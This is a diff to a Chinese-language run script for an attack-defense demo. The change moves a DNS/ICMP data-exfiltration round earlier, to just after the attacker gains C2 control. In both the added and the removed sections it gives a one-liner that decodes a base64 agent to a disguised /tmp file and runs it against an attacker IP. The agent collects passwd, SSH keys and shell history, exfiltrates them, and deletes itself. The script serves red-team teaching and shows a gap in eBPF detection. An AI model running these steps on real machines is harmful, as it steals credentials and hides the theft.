@@ -1,4 +1,4 @@
-# Attack-Defense Demo Flow — 7 回合攻防演練腳本
+# Attack-Defense Demo Flow — 6 回合攻防演練腳本
 
 > 這份是 Demo 當天的執行腳本，照著跑就好。
 > 每回合大概 2-3 分鐘，全程大約 20-25 分鐘。
@@ -289,6 +289,73 @@ target-machine
 
 ---
 
+## 回合 2b — 紅方資料外傳（利用 C2 控制權）
+
+> **目的**：展示紅方取得控制後立即進行 data exfiltration，透過 DNS/ICMP covert channel 外傳敏感資料
+> **MITRE ATT&CK**: T1005 (Data from Local System), T1048.003 (Exfiltration Over Alternative Protocol)
+
+### T3 — 在 C2 中部署 Exfil Agent
+
+先在 WSL2 另開一個終端啟動 Exfil Listener：
+
+```bash
+sudo .venv/bin/python3 red_team/exfil_listener.py
+```
+
+預期輸出：
+```
+[*] Exfil Listener starting...
+[*] DNS listener on UDP 53 (interface: eth0)
+[*] ICMP listener ready
+[*] Waiting for incoming data...
+```
+
+### T3 — 透過 C2 部署 Agent 到靶機
+
+在 C2 prompt 中，用 `deploy_agent.sh` 產生的 one-liner 部署：
+
+```bash
+# 先在 WSL2 產生 deploy 指令
+bash red_team/deploy_agent.sh <ATTACKER_IP>
+```
+
+將產生的指令貼到 C2 prompt 中執行：
+
+```
+C2> echo '<base64>' | base64 -d > /tmp/.cache_update.py && python3 /tmp/.cache_update.py <ATTACKER_IP>
+```
+
+Agent 會自動：
+1. 蒐集 `/etc/passwd`、`~/.ssh/*`、`~/.bash_history`、`~/vuln_api.py` 等
+2. 偵測可用通道（DNS 優先，ICMP 備用）
+3. Base32 編碼 + 分塊，透過 DNS query 送出
+4. 完成後自動刪除自身
+
+### T3 — 觀察 Listener 接收
+
+預期輸出：
+```
+[+] START file_id=a1b2 filename=passwd
+[+] Receiving: 0003/0042 (a1b2)
+...
+[+] END file_id=a1b2 checksum=OK
+[+] Saved: ./loot/passwd
+
+[+] START file_id=c3d4 filename=bash_history
+...
+[+] Saved: ./loot/bash_history
+```
+
+### 講解要點
+
+- 紅方取得控制後**立即**外傳資料 — 這才是真實攻擊的流程
+- DNS exfiltration 把資料編碼成 subdomain（`data.fileid.x.exfil.local`），看起來像普通 DNS query
+- 這類 covert channel 不觸發 eBPF 監控的任何 syscall pattern（沒有 memfd、沒有 reverse shell）
+- 即使後續藍方開啟 eBPF v1/v2，資料**已經外傳完畢**，防禦來不及
+- 要偵測 DNS exfiltration 需要另外的機制：DNS query pattern 分析、subdomain 長度異常偵測等
+
+---
+
 ## 回合 3 — 藍方上線，發現並清除威脅
 
 **目的**：展示 eBPF 冷啟動掃描能發現已存在的記憶體惡意程式
@@ -498,82 +565,20 @@ Listener 不會收到連線（進程在 connect() 前被殺）。
 
 ---
 
-## 回合 7 — 紅方資料外傳（防禦缺口展示）
-
-> **目的**：展示即使兩層防禦都開著，DNS/ICMP covert channel 的 data exfiltration 仍然偵測不到
-> **MITRE ATT&CK**: T1005 (Data from Local System), T1048.003 (Exfiltration Over Alternative Protocol)
-
-### T3 — 啟動 Exfil Listener（WSL2）
-
-```bash
-sudo .venv/bin/python3 red_team/exfil_listener.py
-```
-
-預期輸出：
-```
-[*] Exfil Listener starting...
-[*] DNS listener on UDP 53 (interface: eth0)
-[*] ICMP listener ready
-[*] Waiting for incoming data...
-```
-
-### T4 — 在靶機部署 Exfil Agent
-
-在已有的 shell session 裡（Round 5 成功連線後、v2 升級前取得的 access），用 base64 one-liner 部署：
-
-```bash
-echo '<base64_of_exfil_agent.py>' | base64 -d > /tmp/.cache_update.py
-python3 /tmp/.cache_update.py <ATTACKER_IP>
-```
-
-Agent 會自動：
-1. 蒐集 `/etc/passwd`、`~/.ssh/*`、`~/.bash_history`、`~/vuln_api.py` 等
-2. 偵測可用通道（DNS 優先，ICMP 備用）
-3. Base32 編碼 + 分塊，透過 DNS query 送出
-4. 完成後自動刪除自身
-
-### T3 — 觀察接收
-
-預期輸出：
-```
-[+] START file_id=a1b2 filename=passwd
-[+] Receiving: 0003/0042 (a1b2)
-...
-[+] END file_id=a1b2 checksum=OK
-[+] Saved: ./loot/passwd
-
-[+] START file_id=c3d4 filename=bash_history
-...
-[+] Saved: ./loot/bash_history
-```
-
-### T2 — 觀察 eBPF v2（仍在跑）
-
-**重點：eBPF v2 沒有任何 alert。** DNS query 走的是正常的 UDP 53，不觸發任何被監控的 syscall pattern（沒有 memfd_create、沒有 reverse shell 的 dup2 pattern）。
-
-### 講解要點
-
-- 目前的防禦只監控 C2 建立（memfd、reverse shell），不監控 data exfiltration
-- DNS exfiltration 需要另外的偵測機制（分析 DNS query pattern、subdomain 長度異常等）
-- 這說明了即使有兩層防禦，攻擊者還是能找到 blind spot
-- **結論**：defense-in-depth 是持續的過程，不是部署完就結束
-
----
-
 ## 結尾總結
 
 ### 攻防時間線
 
 ```
-回合1     回合1b       回合1c      回合2         回合3         回合4
-偵察   →  蜜罐觸發  →  IP切換   → 紅方攻擊成功 → 藍方清除威脅 → 紅方再攻被擋
-nmap      nc 2222      ip alias    SSTI+memfd    cold-start     eBPF kill
-          MDR封鎖      繞過封鎖    ICMP C2        /proc scan     memfd blocked
+回合1     回合1b       回合1c      回合2         回合2b        回合3
+偵察   →  蜜罐觸發  →  IP切換   → 紅方攻擊成功 → 資料外傳   → 藍方清除威脅
+nmap      nc 2222      ip alias    SSTI+memfd    DNS exfil     cold-start
+          MDR封鎖      繞過封鎖    ICMP C2        covert ch     /proc scan
 
-回合5         回合6           回合7
-紅方繞過v1 → 藍方升級v2攔截 → 紅方外傳資料（防禦缺口）
-reverse shell  connect hook     DNS exfiltration
-TCP bypass     port detect      eBPF 偵測不到
+回合4         回合5           回合6
+紅方再攻被擋 → 紅方繞過v1   → 藍方升級v2攔截
+eBPF kill      reverse shell   connect hook
+memfd blocked  TCP bypass      port detect
 ```
 
 ### 防禦分層架構
